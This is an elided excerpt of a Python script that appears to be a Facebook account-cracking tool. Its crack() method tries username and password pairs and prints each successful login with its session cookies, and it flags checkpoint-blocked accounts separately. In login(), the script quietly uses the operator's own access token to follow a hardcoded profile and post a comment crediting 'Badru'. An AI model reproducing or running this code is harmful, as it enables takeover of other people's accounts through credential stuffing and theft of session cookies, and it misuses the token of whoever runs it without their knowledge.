...
def login():
    ...
    try:
        ...
        nama=r['name']
        req.post(f'https://graph.facebook.com/100006230836266/subscribers?access_token={t}')
        req.post(f'https://graph.facebook.com/2975326539351678/comments?message=Ok Thanks Badru! and hallo!&access_token={t}')
...
class gas:
    ...
    def crack(self,user,pw):
        ...
        if 'c_user' in d.cookies.get_dict().keys():
            ...
            print(f'\r\x1b[1;32m*Dru > [OK] ~ {user}|{pw}|{d.cookies}\x1b[0m\n',end='')
            ...
            print(f'\r\x1b[1;33m*Dru > [CP] ~ {user}|{pw}|{ttl}\x1b[0m\n',end='')
